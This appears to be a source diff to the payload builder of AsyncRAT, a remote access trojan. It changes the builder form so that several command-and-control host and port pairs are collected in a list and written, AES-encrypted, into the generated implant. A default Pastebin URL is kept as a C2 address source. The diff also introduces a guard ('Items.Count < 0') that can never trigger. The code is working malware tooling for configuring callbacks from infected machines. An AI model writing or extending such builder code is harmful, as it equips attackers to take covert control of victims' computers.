@@ -7,6 +7,7 @@ using System.Text;
 using System.Security.Cryptography;
 using AsyncRAT_Sharp.Cryptography;
 using System.Security.Cryptography.X509Certificates;
+using System.Collections.Generic;
 
 namespace AsyncRAT_Sharp.Forms
 {
@@ -19,7 +20,7 @@ namespace AsyncRAT_Sharp.Forms
 
         private void button1_Click(object sender, EventArgs e)
         {
-            if (string.IsNullOrWhiteSpace(textIP.Text) || string.IsNullOrWhiteSpace(textPort.Text)) return;
+            if (listView1.Items.Count < 0) return;
 
             if (checkBox1.Checked)
             {
@@ -84,8 +85,7 @@ namespace AsyncRAT_Sharp.Forms
         private void Builder_Load(object sender, EventArgs e)
         {
             comboBoxFolder.SelectedIndex = 0;
-            if (Properties.Settings.Default.IP.Length == 0)
-                textIP.Text = "127.0.0.1,127.0.0.1";
+            
             if (Properties.Settings.Default.Pastebin.Length == 0)
                 txtPastebin.Text = "https://pastebin.com/raw/s14cUU5G";
         }
@@ -118,11 +118,23 @@ namespace AsyncRAT_Sharp.Forms
                                     string operand = methodDef.Body.Instructions[i].Operand.ToString();
 
                                     if (operand == "%Ports%")
-                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(textPort.Text);
-
+                                    {
+                                        List<string> LString = new List<string>();
+                                        foreach(ListViewItem LVI in listView1.Items)
+                                        {
+                                            LString.Add(LVI.SubItems[columnHeader2.Index].Text);
+                                        }
+                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",",LString));
+                                    }
                                     if (operand == "%Hosts%")
-                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(textIP.Text);
-
+                                    {
+                                        List<string> LString = new List<string>();
+                                        foreach (ListViewItem LVI in listView1.Items)
+                                        {
+                                            LString.Add(LVI.SubItems[columnHeader1.Index].Text);
+                                        }
+                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", LString));
+                                    }
                                     if (operand == "%Install%")
                                         methodDef.Body.Instructions[i].Operand = checkBox1.Checked.ToString().ToLower();
 
@@ -171,12 +183,34 @@ namespace AsyncRAT_Sharp.Forms
                 txtPastebin.Enabled = true;
                 textIP.Enabled = false;
                 textPort.Enabled = false;
+                listView1.Enabled = false;
+                btnAdd.Enabled = false;
+                btnDelete.Enabled = false;
             }
             else
             {
                 txtPastebin.Enabled = false;
                 textIP.Enabled = true;
                 textPort.Enabled = true;
+                listView1.Enabled = true;
+                btnAdd.Enabled = true;
+                btnDelete.Enabled = true;
+            }
+        }
+
+        private void btnAdd_Click(object sender, EventArgs e)
+        {
+            ListViewItem LVI = new ListViewItem(textIP.Text);
+            LVI.SubItems.Add(textPort.Text);
+            listView1.Items.Add(LVI);
+            textPort.Text = "";
+        }
+
+        private void btnDelete_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem LVI in listView1.SelectedItems)
+            {
+                LVI.Remove();
             }
         }
     }
